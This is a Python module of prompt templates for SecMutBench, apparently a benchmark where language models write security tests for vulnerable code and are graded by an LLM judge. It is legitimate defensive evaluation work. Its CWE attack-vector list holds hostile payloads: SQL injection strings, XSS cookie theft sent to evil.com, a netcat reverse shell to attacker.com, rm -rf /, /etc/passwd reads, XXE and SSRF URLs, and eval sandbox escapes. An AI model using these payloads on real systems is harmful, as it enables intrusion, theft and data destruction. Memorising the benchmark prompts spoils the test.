"""
Unified Prompt Templates for SecMutBench

This module provides consistent prompts for:
1. Test generation (used by LLM baselines)
2. LLM-as-Judge evaluation (security relevance, test quality)

All evaluation scripts should import prompts from this module to ensure consistency.
"""

from typing import Dict, Optional


# =============================================================================
# Mock Environment Documentation
# =============================================================================

MOCK_ENVIRONMENT_DOCS = """**Test Environment (already available, do NOT import):**

**CWE-89 SQL Injection - MockDatabase:**
- `db.execute(query, params=None)`: Execute query, returns list of dicts
- `db.last_query`: String of the last executed SQL query
- `db.last_params`: Tuple of params if parameterized, **None if vulnerable (string interpolation)**
- `db.reset()`: Reset state before test
- **DETECTION**: `assert db.last_params is not None` to detect SQL injection

**CWE-78 Command Injection - MockSubprocess:**
- `subprocess.run(args, shell=False, ...)`: Execute command
- `subprocess.last_command`: The command executed
- `subprocess.last_shell`: Boolean, True if shell=True used
- `subprocess.injection_detected`: **True if shell injection patterns found**
- `subprocess.reset()`: Reset state before test
- **DETECTION**: `assert not subprocess.injection_detected` to detect command injection

**CWE-22 Path Traversal - MockFileSystem:**
- `fs.read_file(path)`: Returns file contents or None
- `fs.file_exists(path)`: Returns True/False
- `fs.base_dir`: The allowed base directory (default: "/var/data")
- **DETECTION**: Check if `ValueError` or `PermissionError` raised for "../" paths

**CWE-327 Weak Cryptography - MockCrypto (as hashlib):**
- `hashlib.md5()`, `hashlib.sha1()`: Weak algorithms
- `hashlib.sha256()`, `hashlib.sha512()`: Strong algorithms
- `hashlib.weak_algorithm_used`: **True if MD5, SHA1, DES, etc. used**
- `hashlib.last_algorithm`: Name of last algorithm used
- `hashlib.reset()`: Reset state before test
- **DETECTION**: `assert not hashlib.weak_algorithm_used` to detect weak crypto

**CWE-502 Insecure Deserialization - MockPickle/MockYAML:**
- `pickle.loads()`, `pickle.load()`: Unsafe deserialization
- `pickle.unsafe_load_called`: **True if pickle.loads/load used**
- `yaml.load()`: Unsafe without SafeLoader
- `yaml.safe_load()`: Safe deserialization
- `yaml.unsafe_load_called`: **True if yaml.load without SafeLoader**
- **DETECTION**: `assert not pickle.unsafe_load_called` to detect insecure deserialization

**CWE-918 SSRF - MockHTTPClient (as requests):**
- `requests.get(url)`, `requests.post(url, ...)`: HTTP methods
- `requests.last_url`: URL of last request
- `requests.ssrf_attempted`: **True if internal URL (localhost, 169.254.x, etc.) accessed**
- `requests.reset()`: Reset state before test
- **DETECTION**: `assert not requests.ssrf_attempted` to detect SSRF

**CWE-611 XXE - MockXMLParser:**
- `xml_parser.parse_unsafe(xml)`: Parse without protection
- `xml_parser.external_entities_resolved`: **True if XXE patterns found**
- **DETECTION**: `assert not xml_parser.external_entities_resolved` to detect XXE

**CWE-798 Hardcoded Credentials - MockEnvironment:**
- `env.get(key)`: Get environment variable
- `env.access_log`: List of accessed keys
- `env.sensitive_accessed`: List of sensitive keys accessed (PASSWORD, SECRET, etc.)
- **DETECTION**: `assert len(env.access_log) > 0` to verify env vars used (not hardcoded)

**Standard libs available:** `os`, `sys`, `re`, `json`, `html`, `base64`, `ast`
**The function under test is already defined in the namespace.**"""


# =============================================================================
# CWE-Specific Attack Vectors
# =============================================================================

CWE_ATTACK_VECTORS = {
    "CWE-89": """- SQL tautology: `' OR '1'='1`, `1 OR 1=1`, `" OR "1"="1`
- UNION injection: `' UNION SELECT * FROM users--`, `' UNION SELECT username,password FROM users--`
- Stacked queries: `'; DROP TABLE users;--`, `'; INSERT INTO users VALUES('hacker','pass');--`
- Comment truncation: `admin'--`, `admin'/*`
- Time-based blind: `' OR SLEEP(5)--`, `' OR pg_sleep(5)--`
- Error-based: `' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--`""",

    "CWE-79": """- Script injection: `<script>alert('XSS')</script>`, `<script>document.location='http://evil.com?c='+document.cookie</script>`
- Event handlers: `<img onerror="alert(1)" src=x>`, `<body onload="alert(1)">`
- SVG injection: `<svg onload="alert(1)">`, `<svg/onload=alert(1)>`
- Data URI: `javascript:alert(1)`, `data:text/html,<script>alert(1)</script>`
- Attribute injection: `" onclick="alert(1)`, `' onfocus='alert(1)'`""",

    "CWE-78": """- Command chaining: `; rm -rf /`, `&& cat /etc/passwd`, `|| whoami`
- Pipe injection: `| cat /etc/passwd`, `| nc attacker.com 1234 -e /bin/sh`
- Backtick execution: `` `whoami` ``, `` `cat /etc/passwd` ``
- Subshell: `$(whoami)`, `$(cat /etc/passwd)`
- Newline injection: `%0als`, `%0a/bin/sh`""",

    "CWE-22": """- Parent traversal: `../../../etc/passwd`, `....//....//etc/passwd`
- Encoded traversal: `%2e%2e%2f`, `%252e%252e%252f`, `..%c0%af`
- Absolute path: `/etc/passwd`, `C:\\Windows\\System32\\config\\SAM`
- Null byte: `file.txt%00.jpg`, `file.txt\\x00.jpg`
- Double encoding: `%252e%252e%252f`""",

    "CWE-287": """- Missing auth check bypass
- Token manipulation/forgery
- Session fixation attacks
- Credential stuffing patterns
- Bypassing `is_authenticated()` checks""",

    "CWE-798": """- Hardcoded passwords in source: `password = "admin123"`
- API keys in code: `api_key = "sk-..."`
- Default credentials: `admin/admin`, `root/root`
- Secrets in config files
- Base64 encoded credentials""",

    "CWE-502": """- Pickle deserialization: `pickle.loads(user_input)`
- YAML unsafe load: `yaml.load(data)` without SafeLoader
- eval() on user input: `eval(user_data)`
- Object injection patterns""",

    "CWE-611": """- External entity injection: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`
- Parameter entity: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]>`
- Blind XXE via error: Force XML errors containing sensitive data""",

    "CWE-918": """- Internal IP access: `http://127.0.0.1`, `http://localhost`, `http://192.168.x.x`
- Cloud metadata: `http://169.254.169.254/latest/meta-data/`
- URL scheme bypass: `file:///etc/passwd`, `dict://`, `gopher://`
- DNS rebinding attacks""",

    "CWE-703": """- Unhandled exceptions exposing stack traces
- Missing try/except around risky operations
- Improper error messages revealing system info
- Resource exhaustion from uncaught errors""",

    "CWE-730": """- ReDoS patterns: `(a+)+$`, `(a|a)*$`, `(.*a){x}`
- Catastrophic backtracking with nested quantifiers
- Alternation with overlap patterns
- CPU exhaustion via regex complexity""",

    # === New CWEs added in v2.5.0 ===
    "CWE-95": """- Direct eval injection: `eval(user_input)`, `exec(user_code)`
- AST bypass attempts: `__import__('os').system('cmd')`
- Code object manipulation: `compile()` with user input
- Builtin access: `__builtins__['eval']`
- Class introspection: `__class__.__mro__[1].__subclasses__()`""",

    "CWE-601": """- Open redirect: `redirect(user_url)` without validation
- URL parameter injection: `?next=http://evil.com`, `?return_url=//attacker.com`
- Protocol-relative URLs: `//evil.com/phish`
- Domain spoofing: `http://legitimate.com@evil.com`
- Path confusion: `/legitimate.com` vs `//legitimate.com`""",

    "CWE-295": """- Disabled verification: `verify=False`, `CERT_NONE`
- Hostname check bypass: `check_hostname=False`
- Unverified context: `ssl._create_unverified_context()`
- Self-signed cert acceptance without validation
- Downgrade attacks: forcing HTTP over HTTPS""",

    "CWE-209": """- Stack trace exposure: `traceback.format_exc()` to user
- Debug mode in production: `debug=True`, `DEBUG=True`
- Verbose error messages: `str(exception)` in response
- System path disclosure in errors
- Database error messages with schema info""",

    "CWE-400": """- ReDoS patterns: `(a+)+`, `([a-zA-Z]+)*`, `(a|aa)+`
- Nested quantifiers: `(.*)*`, `(.+)+`
- Catastrophic backtracking on malicious input
- Regex timeout bypass
- CPU exhaustion via polynomial/exponential complexity""",

    "CWE-1333": """- Same as CWE-400 (ReDoS alias)
- Inefficient regular expression complexity
- Backtracking regex patterns""",

    "CWE-862": """- Missing authorization check on sensitive operation
- Direct object reference without ownership validation
- Admin function without role check
- API endpoint without permission decorator
- Privilege escalation via missing ACL""",

    "CWE-352": """- Missing CSRF token validation
- Cross-site request forgery via form submission
- State-changing GET requests
- Token bypass via referrer manipulation
- SameSite cookie misconfiguration""",
}


def get_attack_vectors(cwe: str) -> str:
    """Get attack vectors for a CWE, with fallback for unknown CWEs."""
    return CWE_ATTACK_VECTORS.get(
        cwe,
        f"- Common attack patterns for {cwe}\n- Boundary condition testing\n- Input validation bypass attempts\n- Malformed input handling"
    )


# =============================================================================
# Test Generation Prompt
# =============================================================================

TEST_GENERATION_PROMPT = """Generate security tests for this Python function to detect {cwe_name} ({cwe}) vulnerabilities.

```python
{code}
```

{mock_env}

**Requirements:**
1. Write pytest-style functions starting with `test_`
2. Tests should PASS when code uses secure patterns (parameterized queries, input validation, etc.)
3. Tests should FAIL when code has vulnerabilities (string concatenation in SQL, missing validation, etc.)
4. Test at least 3 different attack vectors for {cwe}
5. Use assertions to verify security properties (e.g., params not None, payload not in query)
6. Do NOT include import statements or class definitions

**Attack vectors for {cwe_name}:**
{attack_vectors}

**CRITICAL: Assertion Logic for Security Tests**

Tests verify that SECURE code properly handles malicious inputs:

| Vulnerability | CORRECT Assertion (secure code) | WRONG Assertion |
|---------------|--------------------------------|-----------------|
| XSS (CWE-79) | `assert "<script>" NOT in result` | `assert "<script>" in result` |
| SQLi (CWE-89) | `assert db.last_params is not None` | `assert payload in db.last_query` |
| Command Inj (CWE-78) | `assert subprocess.last_shell == False` | `assert ";" in command` |
| Path Traversal (CWE-22) | `assert fs.last_path.startswith(base_dir)` | `assert "../" in path` |

**Key principles:**
- Secure code ESCAPES/SANITIZES input, so raw payload should NOT appear in output
- Secure code uses PARAMETERIZED queries, so `db.last_params is not None`
- Secure code uses `shell=False`, so `subprocess.last_shell == False`
- Test should PASS on secure code, FAIL on insecure code

**FLEXIBLE ASSERTIONS (Check Behavior, Not Exact Strings):**
- Instead of checking exact escaping: check that dangerous characters are neutralized
- Instead of checking exact output: check the BEHAVIOR (exceptions, mock state, return values)
- Use mock object state (`db.last_params`, `subprocess.last_shell`, `fs.last_path`) over output inspection
- Check that exceptions are raised for invalid input: `pytest.raises(ValueError)`
- Multiple assertion styles work: `assert x` OR `if not x: pytest.fail("msg")`

**Example test structure:**
```python
def test_sql_injection_tautology():
    payload = "' OR '1'='1"
    result = target_function(payload)
    # CORRECT: Assert payload is NOT in the query (secure code parameterizes)
    assert payload not in db.last_query, "Payload should not be in SQL query"
    # Also verify parameterization was used
    assert db.last_params is not None, "Query should use parameterized execution"

def test_xss_script_injection():
    payload = "<script>alert('XSS')</script>"
    result = render_greeting(payload)
    # CORRECT: Assert script tag is NOT in output (secure code escapes it)
    assert "<script>" not in result, "XSS: unescaped script tag in output"
    # Escaped version should appear instead
    assert "&lt;script&gt;" in result or "script" not in result.lower()
```

Output ONLY valid Python test functions, nothing else."""


# =============================================================================
# Ablation Study Prompts
# =============================================================================

# Ablation 1: No security hint - just ask for "tests" without any CWE context
PROMPT_NO_HINT = """Write tests for the following Python function.
Generate pytest-compatible test functions.

```python
{code}
```

Entry point: `{entry_point}`

Requirements:
1. Write pytest-style functions starting with `test_`
2. Test the function's behavior with various inputs
3. Include edge cases and boundary conditions
4. Use assertions to verify expected behavior
5. Do NOT include import statements

Output ONLY valid Python test functions, nothing else."""


# Ablation 2: CWE ID only - mention the CWE but no detailed guidance or mock docs
PROMPT_CWE_ID_ONLY = """Write tests to detect {cwe} vulnerabilities in the following Python function.
Generate pytest-compatible test functions.

```python
{code}
```

Entry point: `{entry_point}`

Requirements:
1. Write pytest-style functions starting with `test_`
2. Focus on detecting {cwe} vulnerabilities
3. Tests should PASS on secure implementations
4. Tests should FAIL on vulnerable implementations
5. Do NOT include import statements

Output ONLY valid Python test functions, nothing else."""


def format_prompt_no_hint(code: str, entry_point: str = "function") -> str:
    """
    Format the no-hint ablation prompt.

    This prompt removes all security context - no CWE, no attack vectors,
    no mock environment documentation. Used for ablation study.

    Args:
        code: The source code to generate tests for
        entry_point: The function name to test

    Returns:
        Formatted prompt string
    """
    return PROMPT_NO_HINT.format(
        code=code,
        entry_point=entry_point,
    )


def format_prompt_cwe_id_only(
    code: str,
    cwe: str,
    entry_point: str = "function",
) -> str:
    """
    Format the CWE-ID-only ablation prompt.

    This prompt mentions the CWE but provides no detailed guidance,
    attack vectors, or mock environment documentation. Used for ablation study.

    Args:
        code: The source code to generate tests for
        cwe: CWE identifier (e.g., "CWE-89")
        entry_point: The function name to test

    Returns:
        Formatted prompt string
    """
    return PROMPT_CWE_ID_ONLY.format(
        code=code,
        cwe=cwe,
        entry_point=entry_point,
    )


def format_test_generation_prompt(
    code: str,
    cwe: str,
    cwe_name: str = "vulnerability",
    include_mock_env: bool = True,
) -> str:
    """
    Format the test generation prompt for a given code sample.

    Args:
        code: The source code to generate tests for
        cwe: CWE identifier (e.g., "CWE-89")
        cwe_name: Human-readable CWE name (e.g., "SQL Injection")
        include_mock_env: Whether to include mock environment documentation

    Returns:
        Formatted prompt string
    """
    return TEST_GENERATION_PROMPT.format(
        code=code,
        cwe=cwe,
        cwe_name=cwe_name,
        mock_env=MOCK_ENVIRONMENT_DOCS if include_mock_env else "",
        attack_vectors=get_attack_vectors(cwe),
    )


# =============================================================================
# LLM-as-Judge Prompts
# =============================================================================

SECURITY_RELEVANCE_SYSTEM_PROMPT = """You are an expert security engineer evaluating security tests.
Your task is to assess whether the generated tests effectively target the specified vulnerability type.

Evaluate based on:
1. Does the test target the specific CWE vulnerability?
2. Does it test realistic attack vectors (not just benign inputs)?
3. Does it verify security properties (not just functionality)?
4. Would it detect if the code were vulnerable?
5. Does it use the mock environment correctly (db, fs, response objects)?

Respond in JSON format:
{
    "score": <0-100>,
    "cwe_addressed": <true/false>,
    "attack_vectors_tested": ["vector1", "vector2"],
    "security_properties_checked": ["property1", "property2"],
    "reasoning": "explanation",
    "confidence": <0-100>
}"""


SECURITY_RELEVANCE_PROMPT = """Evaluate the security relevance of these tests for {cwe} ({cwe_name}).

**Code Under Test:**
```python
{code}
```

**Generated Security Tests:**
```python
{tests}
```

**Vulnerability Type:** {cwe} - {cwe_name}

**Expected Attack Vectors:**
{attack_vectors}

Assess whether these tests would effectively detect the vulnerability.
Respond in the JSON format specified."""


def format_security_relevance_prompt(
    code: str,
    tests: str,
    cwe: str,
    cwe_name: str = "vulnerability",
) -> str:
    """Format the security relevance evaluation prompt."""
    return SECURITY_RELEVANCE_PROMPT.format(
        code=code,
        tests=tests,
        cwe=cwe,
        cwe_name=cwe_name,
        attack_vectors=get_attack_vectors(cwe),
    )


TEST_QUALITY_SYSTEM_PROMPT = """You are an expert software tester evaluating test quality.
Your task is to assess the quality of generated security tests.

Evaluate based on:
1. Are assertions specific and meaningful?
2. Are edge cases and boundary conditions tested?
3. Does the test follow best practices (setup, teardown, isolation)?
4. Is the test maintainable and readable?
5. Does it avoid common testing anti-patterns?
6. Does it correctly use the mock environment (db, fs, response)?

Respond in JSON format:
{
    "score": <0-100>,
    "assertions_count": <number>,
    "edge_cases_covered": <number>,
    "follows_best_practices": <true/false>,
    "issues_found": ["issue1", "issue2"],
    "reasoning": "explanation",
    "confidence": <0-100>
}"""


TEST_QUALITY_PROMPT = """Evaluate the quality of these security tests.

**Generated Tests:**
```python
{tests}
```

**Context:**
- Target: {entry_point}
- CWE: {cwe}
- Difficulty: {difficulty}

**Available Mock Environment:**
{mock_env}

Assess test quality including assertions, edge cases, and best practices.
Respond in the JSON format specified."""


def format_test_quality_prompt(
    tests: str,
    entry_point: str = "function",
    cwe: str = "",
    difficulty: str = "unknown",
) -> str:
    """Format the test quality evaluation prompt."""
    return TEST_QUALITY_PROMPT.format(
        tests=tests,
        entry_point=entry_point,
        cwe=cwe,
        difficulty=difficulty,
        mock_env=MOCK_ENVIRONMENT_DOCS,
    )


# =============================================================================
# Exports
# =============================================================================

__all__ = [
    # Constants
    "MOCK_ENVIRONMENT_DOCS",
    "CWE_ATTACK_VECTORS",
    # Test generation
    "TEST_GENERATION_PROMPT",
    "format_test_generation_prompt",
    "get_attack_vectors",
    # Ablation study prompts
    "PROMPT_NO_HINT",
    "PROMPT_CWE_ID_ONLY",
    "format_prompt_no_hint",
    "format_prompt_cwe_id_only",
    # LLM-as-Judge
    "SECURITY_RELEVANCE_SYSTEM_PROMPT",
    "SECURITY_RELEVANCE_PROMPT",
    "format_security_relevance_prompt",
    "TEST_QUALITY_SYSTEM_PROMPT",
    "TEST_QUALITY_PROMPT",
    "format_test_quality_prompt",
]
